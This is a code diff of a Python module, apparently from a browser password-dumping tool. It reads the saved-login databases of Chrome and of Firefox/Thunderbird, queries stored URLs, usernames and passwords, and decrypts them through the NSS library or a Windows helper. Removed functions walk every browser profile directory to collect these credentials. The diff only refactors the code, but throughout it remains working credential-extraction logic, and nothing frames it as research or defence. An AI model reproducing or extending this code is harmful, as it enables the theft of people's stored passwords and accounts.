@@ -9,6 +9,7 @@
 ####
 
 from ctypes import *
+import config
 import sqlite3, os, json, subprocess, base64, glob
 import crypto, logger
 from credentials import Credentials
@@ -33,20 +34,20 @@ WIN_DECRYPTER = "C:\\Users\\John\\Documents\\Visual Studio 2012\\Projects\\Conso
 
 ### End Constants and globals
 
-def getPasswords(loginFile, profile, nss = None, opsys = None):
+def getPasswords(loginFile, profile):
 	""" Select password from relative SQLite database """
 
 	cred = list()
 
 	if not os.path.isfile(loginFile):
-		logger.error("Login file " + loginFile + " does not exists.")
+		logger.error("Login file " + loginFile + " does not exists. (" + profile + ")")
 		return cred
 
 	conn = sqlite3.connect(loginFile)
 
-	if loginFile is GCHROME_LOGIN_FILE:
+	if loginFile is config.GCHROME_LOGIN_FILE:
 		#chrome on windows, run Windows C application
-		if opsys == "Windows":
+		if config.OP_SYS == "Windows":
 			logger.log("Attempting to decrypt Windows Chrome logins")
 
 			query = "SELECT origin_url, username_value, hex(password_value) FROM logins"
@@ -67,18 +68,18 @@ def getPasswords(loginFile, profile, nss = None, opsys = None):
 					logger.error(format(e.errno, e.strerror))
 
 		#chrome on linux, clear text password or encrypted with key chain, simply return the value we found
-		elif opsys == "Linux":
+		elif config.OP_SYS == "Linux":
 			query = "SELECT origin_url, username_value, quote(password_value) FROM logins"
 
 			for row in conn.execute(query):
 				cred.append(Credentials(row[0], row[1], row[2], profile))
 
-	elif loginFile is MOZ_LOGIN_FILE_DB:
+	elif loginFile is config.MOZ_LOGIN_FILE_DB:
 		query = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins"
 		
 		for row in conn.execute(query):
 			  #firefox/thunderbird on linux/windows, use NSS library to decrypt
-			  credentials = decryptMozilla(row[1],row[2], nss)
+			  credentials = decryptMozilla(row[1],row[2], config.LIBNSS)
 			  cred.append(Credentials(row[0], credentials[0], credentials[1], profile))	
 
 	conn.close()
@@ -136,85 +137,19 @@ def decryptMozilla(username, password, libnss):
 
 	return decItems
 	
-def readLoginsJSON(loginFileJSON, profile, nss):
+def readLoginsJSON(loginFileJSON, profile):
 	""" Read the JSON of Firefox login data """
 
 	cred = list()
 
 	if not os.path.isfile(loginFileJSON):
-		logger.error("JSON file " + loginFileJSON + " does not exist.")
+		logger.error("JSON file " + loginFileJSON + " does not exist. (" + profile + ")" )
 		return cred
 
 	data = json.loads(open(loginFileJSON).read())
 
 	for login in data['logins']:
-		credentials = decryptMozilla(login['encryptedUsername'],login['encryptedPassword'], nss)
+		credentials = decryptMozilla(login['encryptedUsername'],login['encryptedPassword'], config.LIBNSS)
 		cred.append(Credentials(login['hostname'], credentials[0], credentials[1], profile))	
-
-	return cred
-
-def readMozillaLogins(sw, profileDir, nss):
-	""" Read and parse the login file of thunderbird or firefox """
-
-	# initialize variable used for return 
-	cred = list()	
-
-	logger.log("\n","no")
-	logger.log(sw.upper())
-
-	#get first default profile directory
-	os.chdir(profileDir)
-
-	#open and read profiles.ini
-	profiles = open("profiles.ini", "r")
-
-	for line in profiles:
-		# get profile directory
-		if line.startswith("Path="): 
-			p = line.split("=")[1].strip("\n")
-			logger.log("Found profile directory " + p)
-			os.chdir(p)
-
-			# look for signons.sqlite
-			cred =  cred + getPasswords(MOZ_LOGIN_FILE_DB, p, nss)
-
-			# look for logins.json
-			cred = cred + readLoginsJSON(MOZ_LOGIN_FILE_JSON, p, nss)
-
-			#go up one directory
-			os.chdir(os.path.dirname(os.getcwd()))
-
-	return cred
-
-def readChromeLogins(chromeProfile, opsys):
-	""" Read and parse the login file of chrome """
-	
-	# initialize variable used for return 
-	cred = list()	
-
-	logger.log("\n","no")
-	logger.log("GOOGLE CHROME")
-
-	os.chdir(chromeProfile)
-
-	#look in default profile
-	if os.path.isdir("Default"):
-		os.chdir("Default")
-		logger.log("Found profile directory Default")
-		cred = cred + getPasswords(GCHROME_LOGIN_FILE, "Default", None, opsys)
-
-		#up one directory
-		os.chdir(os.path.dirname(os.getcwd()))
-
-	#look for other profiles (Profile 1, Profile 2, Profile 3, ...)
-	profiles = glob.glob("Profile *")
-
-	for profile in profiles:
-		os.chdir(profile)
-		logger.log("Found profile directory " + profile)
-		cred = cred + getPasswords(GCHROME_LOGIN_FILE, profile, None, opsys)
-
-		#up one directory
-		os.chdir(os.path.dirname(os.getcwd()))
 
 	return cred
